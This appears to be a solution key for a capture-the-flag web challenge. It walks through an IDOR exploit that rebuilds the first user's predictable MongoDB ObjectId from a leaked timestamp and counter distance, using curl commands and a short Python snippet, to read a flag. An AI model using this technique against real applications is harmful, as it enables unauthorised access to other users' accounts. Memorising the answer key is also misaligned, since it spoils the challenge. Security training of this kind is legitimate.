# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: IDOR via a predictable MongoDB ObjectId. `/profile/:id` reveals the
flag only for the first user's `_id`. A MongoDB ObjectId is
`4-byte timestamp | 5-byte per-process random | 3-byte counter`. The server leaks
the first user's timestamp (`/starttime`) and the counter offset (`distance` from
`/register`), and the random segment is shared across a process's ObjectIds — so
you can reconstruct the first user's `_id`.

1. **Get the first user's embedded timestamp:**

   ```
   curl -s "http://<target>/starttime"
   ```

2. **Register a throwaway account** and note its `userId` and `distance`:

   ```
   curl -s -X POST "http://<target>/register" -d "username=attacker1&password=attackerpass"
   ```

3. **Reconstruct the first user's ObjectId** (reuse your random segment, subtract
   `distance` from your counter, use the leaked timestamp):

   ```python
   oid = "<your userId>"; distance = <distance>; ts = <starttime>
   rand_hex = oid[8:18]
   first = format(ts,'08x') + rand_hex + format(int(oid[18:24],16) - distance, '06x')
   print(first)
   ```

4. **Fetch the first user's profile** by that id:

   ```
   curl -s "http://<target>/profile/<first>"
   ```

5. **Extract the flag** (`FLAG{...}`) from the response and report it verbatim.
